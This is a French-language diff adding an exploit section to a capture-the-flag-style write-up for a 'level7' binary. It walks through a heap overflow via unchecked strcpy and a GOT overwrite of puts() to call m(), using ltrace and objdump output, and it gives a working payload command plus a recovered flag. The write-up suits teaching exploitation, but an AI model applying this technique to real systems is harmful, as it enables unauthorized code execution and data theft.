@@ -214,3 +214,59 @@
       - Call printf avec les arguments stockés sur la stack (eax = printf("%s - %d\n", c, time(0));)<br/><br/>
     - <+43> ... <+44>
       - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
+
+## Exploit
+
+Dans le main, `fopen("/home/user/level8/.pass", "r")` va lire le fichier .pass et `fgets(c, 68, fopen(...))` va écrire son flux dans la variable c.
+La fonction m() affiche le contenu de cette variable, mais n'est pas appelée.
+On note aussi que les strcpy() de la fonction main() copient nos arguments sans protection.
+
+Pour pouvoir afficher notre fichier il faudrait réussire à call m() après fopen(), ce qui nous laisse l'appel à puts() avant de return.
+Il va falloir trouver un moyen de remplacer l'adresse de puts() dans la GOT (cf. level5) par celle de m() pour imprimer le contenu de .pass.
+
+Pour cela, nous allons exploiter le fait que les strcpy() ne soient pas protégés: en cas de buffer overflow du premier, on peut venir écrire sur le premier argument du second strcpy(): l'adresse ou il va écrire la valeur qu'on lui donne en argv[2].
+
+Pour trouver l'offset on va se servir de [ltrace](https://www.tutorialspoint.com/unix_commands/ltrace.htm) et du générateur de pattern:
+- `ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
+  ```
+  __libc_start_main(0x8048521, 2, 0xbffff6f4, 0x8048610, 0x8048680 <unfinished ...>
+  malloc(8)                                                                                              = 0x0804a008
+  malloc(8)                                                                                              = 0x0804a018
+  malloc(8)                                                                                              = 0x0804a028
+  malloc(8)                                                                                              = 0x0804a038
+  strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                              = 0x0804a018
+  strcpy(0x37614136, NULL <unfinished ...>
+  --- SIGSEGV (Segmentation fault) ---
+  +++ killed by SIGSEGV +++
+  ```
+  - Le générateur de pattern nous indique un offset de 20 pour la valeur 0x37614136
+
+Il va donc valloir construire un payload avec 20 random chars + l'adresse de puts() dans la GOT comme premier argument, et l'adresse de m() en second argument.
+
+- `objdump -R level5`
+  ```
+  level7:     file format elf32-i386
+
+  DYNAMIC RELOCATION RECORDS
+  OFFSET   TYPE              VALUE
+  08049904 R_386_GLOB_DAT    __gmon_start__
+  08049914 R_386_JUMP_SLOT   printf
+  08049918 R_386_JUMP_SLOT   fgets
+  0804991c R_386_JUMP_SLOT   time
+  08049920 R_386_JUMP_SLOT   strcpy
+  08049924 R_386_JUMP_SLOT   malloc
+  08049928 R_386_JUMP_SLOT   puts
+  0804992c R_386_JUMP_SLOT   __gmon_start__
+  08049930 R_386_JUMP_SLOT   __libc_start_main
+  08049934 R_386_JUMP_SLOT   fopen
+  ```
+  - l'adresse de puts() dans la GOT est 0x8049928
+
+On a vu dans l'analyse que l'adresse de m() est 0x080484f4.
+
+Du coup en passant les adresses en little endian:
+- `./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`
+  ```
+  5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+   - 1664369431
+  ```
